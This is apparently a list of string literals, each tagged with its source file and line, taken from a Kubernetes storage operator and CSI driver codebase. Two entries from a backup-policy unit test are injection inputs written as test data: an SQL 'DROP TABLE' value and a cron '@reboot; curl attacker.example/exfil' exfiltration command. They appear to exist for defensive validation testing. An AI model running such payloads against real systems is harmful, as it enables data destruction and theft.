!!! note \"Title\"	.claude/skills/house-style/scripts/check-simplyblock-spelling.py:69
!(has(self.enableAtomic4kWrites) && self.enableAtomic4kWrites) || (has(self.enableChecksum	operator/api/v1alpha1/storagecluster_types.go:292
!(has(self.enableLogicalBlockDevices) && self.enableLogicalBlockDevices) || !(has(self.pci	operator/api/v1alpha2/operatorops_types.go:77
!has(oldSelf.fabricType) || self.fabricType == oldSelf.fabricType	operator/api/v1alpha1/storagecluster_types.go:286
!has(oldSelf.hashicorpVaultSettings) || self.hashicorpVaultSettings == oldSelf.hashicorpVa	operator/api/v1alpha1/storagecluster_types.go:287
!has(oldSelf.nvmfBasePort) || self.nvmfBasePort == oldSelf.nvmfBasePort	operator/api/v1alpha1/storagecluster_types.go:289
!has(oldSelf.rpcBasePort) || self.rpcBasePort == oldSelf.rpcBasePort	operator/api/v1alpha1/storagecluster_types.go:290
!has(oldSelf.snodeApiPort) || self.snodeApiPort == oldSelf.snodeApiPort	operator/api/v1alpha1/storagecluster_types.go:291
!has(oldSelf.spec.backupRef) || self.spec.backupRef.name == oldSelf.spec.backupRef.name	operator/api/v1alpha1/backuprestore_types.go:136
!has(oldSelf.stripe) || self.stripe == oldSelf.stripe	operator/api/v1alpha1/storagecluster_types.go:288
!has(self.dhchap) || !self.dhchap || (has(self.allowedNodes) && size(self.allowedNodes) > 	operator/api/v1alpha1/storagepool_types.go:112
!has(self.spec.nodeConfigs) || self.spec.nodeConfigs.all(k, self.spec.workerNodes.exists(w	operator/api/v1alpha1/storagenodeset_types.go:327
!has(self.spec.nodeFailureDomains) || self.spec.nodeFailureDomains.all(k, self.spec.nodeFa	operator/api/v1alpha1/storagenodeset_types.go:326
!has(self.state) || self.state in ['Inspecting','Probing','Writing']	operator/api/v1alpha2/operatorops_types.go:196
!has(self.state) || self.state in ['Validating','CreatingCluster','AwaitingCluster','Creat	operator/api/v1alpha2/clusterdeploymentconfig_types.go:323
!has(self.state) || self.state in ['Validating','Migrating']	operator/api/v1alpha2/storagepoolops_types.go:107
!has(self.state) || self.state in ['Validating','Restoring','AwaitingVolume','Binding']	operator/api/v1alpha2/storagebackupops_types.go:189
!has(self.state) || self.state in ['Validating','Suspending','Promoting']	atlas-lib/statemachine/kubernetes.go:23
!oldSelf.approved || self == oldSelf	operator/api/v1alpha2/clusterdeploymentconfig_types.go:269
!oldSelf.approved || self.approved	operator/api/v1alpha2/clusterdeploymentconfig_types.go:270
# Generated by check-work-plan.py from {}.	.claude/skills/work-plan/scripts/check-work-plan.py:368
# Note: the operator requires a pinned volume	.claude/skills/house-style/scripts/markdown_common.py:630
# Read it before running it: it creates issues in the simplyblock repository,	.claude/skills/work-plan/scripts/check-work-plan.py:369
# container within them that has the host	operator/test/fio_migration_test.py:187
# depend on it.	.claude/skills/work-plan/scripts/check-work-plan.py:371
# in wave order, substituting each created number into the items that	.claude/skills/work-plan/scripts/check-work-plan.py:370
## 1. Execution Order	.claude/skills/work-plan/scripts/check-work-plan.py:314
### Acceptance criteria	.claude/skills/work-plan/scripts/check-work-plan.py:69
### Critical path	.claude/skills/work-plan/scripts/check-work-plan.py:324
### Serialization notes	.claude/skills/work-plan/scripts/check-work-plan.py:335
, StringOrDefault(To(complex(1, 2)),	atlas-lib/ptr/ptr_test.go:313
, StringOrDefault(To(complex64(complex(1, 2))),	atlas-lib/ptr/ptr_test.go:312
, StringOrDefault(To(false),	atlas-lib/ptr/ptr_test.go:297
, StringOrDefault(To(float32(1.5)),	atlas-lib/ptr/ptr_test.go:310
, StringOrDefault(To(int16(-16)),	atlas-lib/ptr/ptr_test.go:301
, StringOrDefault(To(int32(-32)),	atlas-lib/ptr/ptr_test.go:302
, StringOrDefault(To(int64(math.MaxInt64)),	atlas-lib/ptr/ptr_test.go:303
, StringOrDefault(To(int8(-8)),	atlas-lib/ptr/ptr_test.go:300
, StringOrDefault(To(true),	atlas-lib/ptr/ptr_test.go:296
, StringOrDefault(To(uint(7)),	atlas-lib/ptr/ptr_test.go:304
, StringOrDefault(To(uint16(65535)),	atlas-lib/ptr/ptr_test.go:306
, StringOrDefault(To(uint32(42)),	atlas-lib/ptr/ptr_test.go:307
, StringOrDefault(To(uint64(math.MaxUint64)),	atlas-lib/ptr/ptr_test.go:308
, StringOrDefault(To(uint8(255)),	atlas-lib/ptr/ptr_test.go:305
, StringOrDefault(To(uintptr(16)),	atlas-lib/ptr/ptr_test.go:309
, SysfsPath: filepath.Join(t.TempDir(),	atlas-lib/nvmeof/cli_test.go:254
, TargetCluster:	operator/internal/controller/replicationpair_controller_unit_test.go:206
, TransportNVMe}, {	atlas-lib/blockdev/scan_test.go:303
, UID: types.UID(	operator/internal/upgrade/steps/ownership_test.go:62
, Value: fmt.Sprintf(	operator/internal/controller/storagenode_latency_controller.go:388
, Value: ptr.StringOrDefault(sn.Spec.UbuntuHost,	operator/internal/utils/storage_nodeset_ds.go:101
, VolumeHandle:	atlas-lib/kube/resolver_test.go:42
, [q for q in csi if	operator/test/fio_migration_test.py:2064
, and a trailing plural	.claude/skills/house-style/scripts/check-prose.py:245
, apiError{StatusCode: status, Message: fmt.Sprintf(	operator/internal/controller/backuprestore_controller.go:708
, args: []string{	operator/internal/controllers/driver/adoption_test.go:426
, backupId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:6343
, baseline.P50NS,	operator/internal/controller/storagenode_latency_controller.go:244
, blockdev.Reading{Content: blockdev.ContentFilesystem, Type:	atlas-lib/volstack/layers/lvmphysicalvolume_test.go:184
, c.kubeconfig,	test/integration/cluster/kubectl.go:39
, c.talosconfig,	test/integration/cluster/talos.go:409
, cluster.Name,	operator/internal/controller/storageclusterops_controller.go:187
, clusterCR.Name,	operator/internal/controller/simplyblockstoragenodeset_controller.go:1688
, clusterCR.Status.ErasureCodingScheme,	operator/internal/controller/nodedrain_controller.go:178
, clusterId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:5527
, clusterUUID,	operator/internal/controller/persistentvolumeclaim_controller.go:153
, code: 2, want:	atlas-lib/blockdev/blkid_test.go:36
, comment lines (leading	operator/internal/cpinformer/sse.go:34
, controllerPodName,	operator/test/e2e/e2e_test.go:103
, currentSlot.Name,	operator/internal/controller/pvcreplication_controller.go:102
, currentStatus,	operator/internal/controller/storagenodeops_controller.go:252
, default=None, help=	operator/test/fio_migration_test.py:3806
, default=None, metavar=	operator/test/fio_migration_test.py:3723
, defaultNamespace(),	operator/cmd/simplyblock-upgrade/root.go:90
, deviceId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:7685
, false, 0), makeVP(	operator/internal/autoplacement/autobalancing_test.go:154
, filepath.Base(current),	atlas-lib/pci/rebind.go:111
, fs, err), err == nil && fs ==	test/integration/suites/formatprobe_test.go:119
, hostNqn, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:10100
, http.StatusConflict, []byte(`{	operator/internal/webapi/rebalancing_test.go:420
, identity.ID,	atlas-lib/link/hub.go:338
, keys: []string{	atlas-lib/internal/cpapi/gen/main_test.go:259
, kube.ParamMaxMBytesPerSec:	atlas-lib/kube/qos_test.go:137
, kube.ParamQoSRWIOPS:	atlas-lib/kube/qos_test.go:196
, kube.ParamQoSRWMBytes:	atlas-lib/kube/qos_test.go:138
, len(missing), missing[0].oldKey+	operator/internal/upgrade/steps/migrate.go:93
, len(parts[i])/2) + strings.Repeat(	operator/internal/upgrade/derive/boundary_test.go:196
, len(vm.Status.ValidationJobs),	operator/internal/controller/volumemigration_controller.go:580
, log: &log, ensureErr: errors.New(	atlas-lib/volstack/runner_test.go:222
, log: &log, exposes:	atlas-lib/volstack/runner_test.go:136
, log: log, device:	atlas-lib/volstack/layers/members_test.go:76
, logicalVolume,	atlas-lib/lvm/volume.go:205
, lvolId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:6907
, m.MemberCount,	operator/internal/webapi/rebalancing.go:394
, map[string]string{AnnoHostID:	atlas-lib/kube/storageclass_test.go:109
, mc.Volume.UUID,	operator/internal/controller/volumerebalancer_controller.go:210
, metricsServiceName,	operator/test/e2e/e2e_test.go:186
, migrationId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:11028
, namespace, pod,	test/integration/cluster/copy.go:47
, nicId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:8265
, nil); msg !=	test/integration/cluster/talos_test.go:77
, nil, fmt.Errorf(	operator/cmd/simplyblock-rebalancer/main.go:443
, nqn, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:10899
, numbered(segment,	atlas-lib/blockdev/scan.go:419
, off, fmt.Sprintf(	atlas-lib/blockdev/signatures.go:292
, op), slog.Any(	atlas-lib/errs/deferrers/deferrers.go:65
, ops.Spec.Action,	operator/internal/controller/storagenodeops_controller.go:133
, ops.Status.Step.State,	operator/internal/controllers/deployment/operatorops_controller.go:148
, opsTestNS, opsTestCluster, sevenNodeTopology(	operator/internal/controller/storagenodeops_controller_unit_test.go:191
, outstanding,	operator/internal/controller/volumerebalancer_controller.go:517
, pair.Status.ActiveOpsRef,	operator/internal/controller/replicationops_controller.go:184
, params.CloneName, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationQuery, T	atlas-lib/internal/cpapi/cpapi.gen.go:9891
, params.ClusterId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationQuery, T	atlas-lib/internal/cpapi/cpapi.gen.go:11417
, policy.Name,	operator/internal/controller/replicationpolicy_controller.go:173
, policyId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:5946
, poolId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:8767
, ptr.StringOrDefault(cluster.Spec.VCPUCount,	operator/internal/controller/simplyblockstoragenodeset_pernodeconfig.go:245
, ptr.StringOrDefault(eff.JournalManagerSpec.PercentPerDevice,	operator/internal/controller/simplyblockstoragenodeset_pernodeconfig.go:252
, pv.Spec.ClaimRef.Name,	operator/internal/controller/simplyblockstoragenodeset_drain.go:181
, pvc.Namespace,	operator/internal/controller/backuppolicy_controller.go:596
, r.URL.Query(), &params.CloneName, runtime.BindQueryParameterOptions{Type:	test/integration/controlplane/cpsim.gen.go:5668
, r.URL.Query(), &params.ClusterId, runtime.BindQueryParameterOptions{Type:	test/integration/controlplane/cpsim.gen.go:6906
, re.sub(APOSTROPHE,	.claude/skills/house-style/scripts/check-voice.py:109
, required=True, help=	shared/export-openapi.py:116
, resource, name,	csi-driver/e2e/dhchap.go:552
, result: scriptedResult{}}, want:	csi-driver/internal/mount/mount_test.go:59
, sanityClusterID, sanityPoolUUID,	csi-driver/internal/csi/controller/inspect_test.go:46
, scName, false),	csi-driver/e2e/reconnect.go:73
, sess.RemoteAddr(),	atlas-lib/link/hub.go:315
, sn.Spec.WorkerNode,	operator/internal/controller/simplyblockstoragenodeset_storagenode.go:184
, snapshotId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:9181
, spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge:	operator/internal/controller/backuppolicy_controller_unit_test.go:716
, state.Hostname,	operator/internal/controller/nodedrain_controller.go:644
, stateCluster +	operator/internal/volumemigration/state_test.go:64
, status.Error(codes.Unauthenticated,	atlas-lib/link/auth.go:67
, status.Errorf(codes.Aborted,	csi-driver/internal/csi/controller/snapshot.go:276
, status.Errorf(codes.Unavailable,	atlas-lib/link/kubeauth.go:151
, strconv.FormatInt(def.StripeChunkBytes/1024, 10)+	atlas-lib/lvm/volume.go:252
, strings.Join(devices,	atlas-lib/lvm/lvm.go:90
, strings.Join(options,	test/integration/onnode/filesystem.go:43
, stripe alignment OFF (mkfs.xfs defaults, sunit=swidth=0)	operator/test/fio_migration_test.py:512
, subscriptions.DeviceDTO{Status:	operator/internal/controller/storagedevice_controller_unit_test.go:98
, targetId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:7056
, taskId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:11287
, testCluster, testLvol); p.Prefix !=	atlas-lib/nqn/nqn_test.go:30
, testConsumerNode,	operator/internal/controller/volumemigration_controller_unit_test.go:834
, testLvolID, map[string]string{	operator/internal/controllers/backup/storagebackuppolicy_controller_test.go:87
, testNode), ObjectName(	operator/internal/nodeprobe/configmap_test.go:66
, testPVC2Name,	operator/internal/controller/backuppolicy_controller_unit_test.go:407
, testSiblingNode,	operator/internal/controller/volumemigration_controller_unit_test.go:902
, testVolumeB,	operator/internal/metricsapi/storage_test.go:190
, testVolumeB, testNamespace,	operator/internal/metricsapi/storage_test.go:265
, the documentation describes the system impersonally	.claude/skills/house-style/scripts/check-voice.py:132
, tls: simplyblockv1alpha2.DriverTLS{}, wantEnv:	operator/internal/controllers/driver/tls_test.go:35
, together with the forms built on them.	.claude/skills/house-style/scripts/check-american-english.py:93
, true), ownedBySet(	operator/internal/upgrade/check/spine_test.go:112
, true, false,	test/integration/controlplane/cpsim.gen.go:2350
, type=int, default=600, help=	operator/test/fio_migration_test.py:3741
, uuid: handoffUUID +	test/integration/suites/volstack_handoff_test.go:73
, vm.Status.MigrationUUID,	operator/internal/controller/volumemigration_controller.go:387
, vm.Status.SubsystemNQN,	operator/internal/controller/volumemigration_controller.go:400
, volumeId, runtime.StyleParamOptions{ParamLocation: runtime.ParamLocationPath, Type:	atlas-lib/internal/cpapi/cpapi.gen.go:6384
, which is EILSEQ, fio	operator/test/fio_migration_test.py:2975
, {} co-tenant volume(s) at risk	atlas-lib/nvmeof/inspect.go:163
, {} where the target served before cutover	operator/test/fio_migration_test.py:3342
, {} with a subsystem split across nodes	operator/test/fio_migration_test.py:3330
, {}))} schemas	shared/export-openapi.py:53
, {}={}, {}={}	operator/test/fio_migration_test.py:514
, {}s	operator/test/fio_migration_test.py:2647
,0)} samples ->	operator/test/fio_migration_test.py:3537
- **Foo** - bar	.claude/skills/house-style/scripts/check-punctuation.py:276
- :material-cog-refresh:{} **Operate Simplyblock**	.claude/skills/house-style/scripts/check-simplyblock-spelling.py:65
- {}: {} occurrence(s)	.claude/skills/house-style/scripts/check-simplyblock-spelling.py:519
--addr, --port and --nqn (or FIO_NODE_ADDR/FIO_NODE_PORT/FIO_VOLUME_NQN) are required	operator/cmd/simplyblock-rebalancer/main.go:137
--dhchap-ctrl-secret = {}, want the ctrl secret	atlas-lib/nvmeof/cli_test.go:131
--dhchap-secret = {}, want the host secret	atlas-lib/nvmeof/cli_test.go:128
--dhchap-secret=DHHC-1:00:secret: --dhchap-ctrl-secret=DHHC-1:00:ctrlsecret: --tls	csi-driver/internal/initiator/exec_test.go:57
--hostid = {}, want {} derived from the host NQN, not the node's	atlas-lib/nvmeof/cli_test.go:137
--hostnqn = {}, want the target's {}	atlas-lib/nvmeof/cli_test.go:134
--keep set; leaving resources (label test={})	operator/test/fio_migration_test.py:3578
--kubelet-registration-path = {}, want the path for {}	operator/internal/controllers/driver/workloads_test.go:108
--label {shell_quote(	.claude/skills/work-plan/scripts/check-work-plan.py:394
--mode must be baseline, probe, validate-migration,	operator/cmd/simplyblock-rebalancer/main.go:160
--no-migrations set: running fio load only	operator/test/fio_migration_test.py:3662
--nr-io-queues={} --keep-alive-tmo={}	test/integration/controlplane/connect.go:160
--output is {}, and it is configmap or stdout	operator/cmd/simplyblock-nodeprobe/main.go:223
--reconnect-delay={} --ctrl-loss-tmo={} --fast_io_fail_tmo={}	test/integration/controlplane/connect.go:159
--timeout is {}, and a collection needs a positive one	operator/cmd/simplyblock-nodeprobe/main.go:253
--transport=tcp --traddr=1.2.3.4 --trsvcid=4420 --nqn=nqn.test	csi-driver/internal/initiator/exec_test.go:55
--transport={} --traddr={} --trsvcid={} --nqn={}	test/integration/controlplane/connect.go:161
--verify_fatal={}	operator/test/fio_migration_test.py:639
--xfs-su and --xfs-sw must be given together (the CSI node plugin ignores	operator/test/fio_migration_test.py:3823
--xfs-sw must be a non-negative integer, got {}	operator/test/fio_migration_test.py:3814
-ise becomes -ize	.claude/skills/house-style/scripts/check-american-english.py:9
-test.v -test.timeout=20m -test.run	test/integration/suites/volstack_grow_test.go:229
-test.v -test.timeout=30m	test/integration/suites/volstack_test.go:126
.Field}}: {{printf	atlas-lib/internal/cpapi/gen/main.go:582
.Owns(&batchv1.Job{}), so the Job	.claude/skills/reconciler-patterns/scripts/check-reconcilers.py:220
.join(COMPOUNDS) + r	.claude/skills/house-style/scripts/check-prose.py:234
.join(DEFAULT_CODE_DIRS)} in the repository root)	.claude/skills/house-style/scripts/check-identifiers.py:353
.join(DEFAULT_TARGET_DIRS)} in the repository root)	.claude/skills/house-style/scripts/check-american-english.py:380
.join(alternatives) + r	.claude/skills/house-style/scripts/check-american-english.py:296
.join(b for b in block if not b.startswith(	.claude/skills/api-design/scripts/check-crds.py:114
.join(ids)} | {} |	.claude/skills/work-plan/scripts/check-work-plan.py:321
.join(label(p) for p in sorted(on_target))}	operator/test/fio_migration_test.py:1888
.join(lines).rstrip() +	.claude/skills/work-plan/scripts/check-work-plan.py:81
.join(path)} ({} items, weight {})	.claude/skills/work-plan/scripts/check-work-plan.py:326
.join(rendered) +	.claude/skills/house-style/scripts/check-tables.py:97
.join(repr(o) for o in offenders)}.	.claude/skills/api-design/scripts/check-crds.py:492
.join(sorted(entries1)) or	helm-charts/scripts/merge_helm_repos.py:124
.join(sorted(entries2)) or	helm-charts/scripts/merge_helm_repos.py:125
.join(sorted(set(missed))) +	operator/test/fio_migration_test.py:1194
.join(src_addrs)} and target	operator/test/fio_migration_test.py:1528
.join(str(len(p)) for p in sorted(shared, key=len, reverse=True)) or	operator/test/fio_migration_test.py:3468
.join(str(n) for n in numbers)}	.claude/skills/house-style/scripts/markdown_common.py:1075
.join(tgt_addrs)} were BOTH optimized at {}	operator/test/fio_migration_test.py:1529
.partN file means the follower was re-attached	operator/test/fio_migration_test.py:3548
.tgz files copied: {} (repo1) + {} (repo2)\n	helm-charts/scripts/merge_helm_repos.py:156
0 StorageClusters, 0 StorageNodeSets, 0 StorageNodes, 0 dependents	operator/internal/upgrade/spine/render_test.go:200
1 StorageNodeSet will be deleted.	operator/internal/upgrade/graph_test.go:131
1 for the phase the storage device is in, 0 for every other phase.	operator/internal/controller/storagedevice_metrics.go:48
1 for the phase the storage pool is in, 0 for every other phase.	operator/internal/controllers/pool/metrics.go:80
1 node in each of the 2 domains	operator/internal/controller/nodedrain_controller.go:1381
1/2/3 exceeds +/-1 spread	operator/internal/controller/simplyblockstoragecluster_controller_unit_test.go:130
100% above baseline	operator/internal/volumemigration/scoring_test.go:26
2 StorageNodes will be reparented.	operator/internal/upgrade/graph_test.go:132
2 of its NVMe controllers	operator/internal/discovery/rules_test.go:226
2 tasks in total	operator/internal/upgrade/blocked_test.go:91
2 tasks in total.	operator/internal/upgrade/graph_test.go:133
25 1 0:24 / / rw - overlay overlay rw	atlas-lib/blockdev/tree_test.go:173
25 1 259:5 / / rw,relatime shared:1 - ext4 /dev/nvme2n1p1 rw	atlas-lib/inventory/devices_fixture_test.go:66
2>/dev/null && echo	test/integration/suites/pool_test.go:128
2>/dev/null | grep -E	operator/test/fio_migration_test.py:2336
2>/dev/null):$(cat	operator/test/fio_migration_test.py:204
3 unclaimed devices	operator/internal/discovery/placement_test.go:35
3s after cutover	operator/test/fio_migration_test.py:2609
400 already-exists (field case)	operator/internal/webapi/rebalancing_test.go:421
400 already-exists uppercase	operator/internal/webapi/rebalancing_test.go:422
400 generic bad request	operator/internal/webapi/rebalancing_test.go:424
400 volume already on node	operator/internal/webapi/rebalancing_test.go:423
409 Conflict: the object has been modified; please apply your changes to the latest versio	operator/internal/controller/simplyblockstoragecluster_controller_unit_test.go:707
409 with a different source: got {}, want AlreadyExists (err: {})	csi-driver/internal/csi/controller/snapshot_test.go:159
409 with the same source must be idempotent success, got: {}	csi-driver/internal/csi/controller/snapshot_test.go:130
50% above baseline	operator/internal/volumemigration/scoring_test.go:25
500 server error	operator/internal/webapi/rebalancing_test.go:427
63-char value should be unchanged	operator/internal/controller/nodedrain_controller_unit_test.go:168
64 bytes against a limit of 63	operator/internal/upgrade/check/names_test.go:128
7d; DROP TABLE backups;--	operator/internal/controller/backuppolicy_controller_unit_test.go:784
: British doubles it before a suffix (	.claude/skills/house-style/scripts/check-american-english.py:163
: _mask_python,	.claude/skills/house-style/scripts/markdown_common.py:826
: ` + itoa(sizeUsed) + `,	operator/internal/cpinformer/subscriptions/volume_test.go:46
: fmt.Sprintf(	operator/internal/controller/replicationpair_controller.go:192
: func() error { _, err := s.DeviceByPath(ctx,	atlas-lib/storage/accessor_test.go:293
: func() error { _, err := s.DeviceByUUID(ctx,	atlas-lib/storage/accessor_test.go:292
: func() error { _, err := s.SubsystemByNQN(ctx,	atlas-lib/storage/accessor_test.go:286
: iso(base) if base else	operator/test/fio_migration_test.py:2969
: iso(m.start),	operator/test/fio_migration_test.py:3146
: len(m.ana_samples),	operator/test/fio_migration_test.py:3156
: list(migs.values()),	operator/test/fio_migration_test.py:2919
: m.actual_node,	operator/test/fio_migration_test.py:3148
: m.cr_match_ok,	operator/test/fio_migration_test.py:3145
: m.group_pvs,	operator/test/fio_migration_test.py:3141
: m.pre_snapshot,	operator/test/fio_migration_test.py:3149
: m.pre_snapshot_id,	operator/test/fio_migration_test.py:3266
: m.split_group,	operator/test/fio_migration_test.py:3178
: m.target_policy,	operator/test/fio_migration_test.py:3152
: map[string]any{	operator/internal/upgrade/release/release_test.go:239
: min(deltas),	operator/test/fio_migration_test.py:3295
: namespaceDeviceGlob(	csi-driver/internal/initiator/device_test.go:655
: newSizingStorageCluster(nil, nil,	operator/internal/controller/simplyblockstoragenodeset_storagenode_unit_test.go:179
: newSizingStorageCluster(ptr.To(int32(20)), nil,	operator/internal/controller/simplyblockstoragenodeset_storagenode_unit_test.go:181
: resource.MustParse(	operator/internal/discovery/kubenode_test.go:27
: round(m.ana_stall_s, 1),	operator/test/fio_migration_test.py:3196
: sanityClusterID,	csi-driver/internal/csi/controller/provisioner_test.go:148
: sanityPoolName,	csi-driver/internal/csi/controller/mock_controlplane_test.go:203
: self.a.xfs_su,	operator/test/fio_migration_test.py:2944
: self.kind_of.get(m.pod,	operator/test/fio_migration_test.py:3137
: self.kind_of.get(pod,	operator/test/fio_migration_test.py:2963
: self.nqn_of.get(pv,	operator/test/fio_migration_test.py:2964
: self.run_id,	operator/test/fio_migration_test.py:718
: snapshot.UUID,	csi-driver/internal/csi/controller/mock_controlplane_test.go:353
: stamp if when else	operator/test/fio_migration_test.py:2651
: subsystem_pvs,	operator/test/fio_migration_test.py:2918
: testCluster,	atlas-lib/prometheus/prometheus_test.go:89
: tmax - start + 1,	operator/test/fio_migration_test.py:2540
: volume.UUID,	csi-driver/internal/csi/controller/mock_controlplane_test.go:211
: {DriveSizeRange:	operator/internal/controller/simplyblockstoragenodeset_storagenode_unit_test.go:155
: {clusterUUID:	operator/internal/autoplacement/autobalancing_test.go:83
<!-- Generated. Run `.claude/skills/work-plan/scripts/check-work-plan.py	.claude/skills/work-plan/scripts/check-work-plan.py:315
<nqn> [N member(s)] <pod>(nsN), <pod>(nsN), …	operator/test/fio_migration_test.py:2876
<pod>/fio.log fio pod container stdout (eta/IOPS status lines)	operator/test/fio_migration_test.py:3544
<pod>/result.json fio final JSON summary	operator/test/fio_migration_test.py:3543
<pod>/timeseries.csv per-second IOPS & clat latency, with active migration	operator/test/fio_migration_test.py:3542
<string sample value>	operator/internal/webhook/simplyblock_volume_placement_injector_test.go:126
<sup>2</sup> Test setups require ...	.claude/skills/house-style/scripts/markdown_common.py:128
<this file> --write` to refresh this section, and never edit the	.claude/skills/work-plan/scripts/check-work-plan.py:316
<why these two cannot be in flight together>	.claude/skills/work-plan/scripts/check-work-plan.py:297
= {} ]; then basename	test/integration/suites/formatprobe_test.go:243
=== fio migration test run_id={} ===	operator/test/fio_migration_test.py:3597
=== re-analysing {} (no cluster access) ===	operator/test/fio_migration_test.py:3836
=> lossy interval ~{st[	operator/test/fio_migration_test.py:3379
> /logs/fio.rc\n	operator/test/fio_migration_test.py:662
>/dev/null 2>&1 && echo	test/integration/suites/pool_test.go:132
@reboot; curl attacker.example/exfil	operator/internal/controller/backuppolicy_controller_unit_test.go:758
A `rbac-justified:` note on or just above the granting line.	.claude/skills/rbac-hardening/scripts/check-rbac.py:133
